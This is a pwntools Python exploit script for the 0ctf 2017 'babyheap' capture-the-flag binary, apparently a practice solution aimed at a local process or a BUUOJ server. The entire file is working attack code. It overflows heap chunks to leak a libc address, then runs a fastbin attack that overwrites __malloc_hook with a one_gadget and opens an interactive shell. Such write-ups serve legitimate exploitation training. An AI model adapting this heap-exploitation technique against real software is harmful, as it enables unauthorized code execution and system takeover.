# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = '0ctf_2017_babyheap'
islocal = 1
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 26690)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def allocate(size):
    p.sendlineafter("Command: ", "1")
    p.sendlineafter("Size: ", str(size))

def fill(idx, content):
    p.sendlineafter("Command: ", "2")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ", str(len(content)))
    p.sendlineafter("Content: ", content)

def delete(idx):
    p.sendlineafter("Command: ", "3")
    p.sendlineafter("Index: ", str(idx))

def dump(idx):
    p.sendlineafter("Command: ", "4")
    p.sendlineafter("Index: ", str(idx))

def leak():
    global malloc_hook, libc_base

    allocate(0x10)
    # debug(0)
    allocate(0x10)
    # debug(0)
    allocate(0x80)
    # debug(0)
    allocate(0x30)
    # debug(0)
    allocate(0x68)
    # debug(0)
    allocate(0x10)
    # debug(0)

    fill(0, p64(0) * 3 + p64(0xb1))
    # debug(0)
    delete(1)
    # debug(0)
    allocate(0xa0)
    # debug(0)
    fill(1, p64(0) * 3 + p64(0x91))
    # debug(0)
    delete(2) 
    # debug(0)  
    dump(1)
    fd = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    libc_base = fd - 0x3c4b78
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    system_addr = libc_base + libc.symbols['system']
    log.success('fd => ' + hex(fd))
    log.success('libc_base => ' + hex(libc_base))
    log.success('malloc_hook => ' + hex(malloc_hook))

def pwn():
    # debug(0)
    # pause()
    delete(4)
    # debug(0)
    fill(3, p64(0) * 7 + p64(0x71) + p64(malloc_hook - 0x23))
    # debug(0)
    allocate(0x68)
    # debug(0)
    allocate(0x68)
    # debug(0)
    # offline one_gadget
    one_gadget = libc_base + 0x4527a

    # online one_gadget
    # one_gadget = libc_base + 0x4526a
    fill(4, '\x00' * 0x13 + p64(one_gadget))
    # debug(0)
    allocate(0x10)
    # debug(0)
    pause()

    p.interactive()

if __name__ == '__main__':
    leak()
    pwn()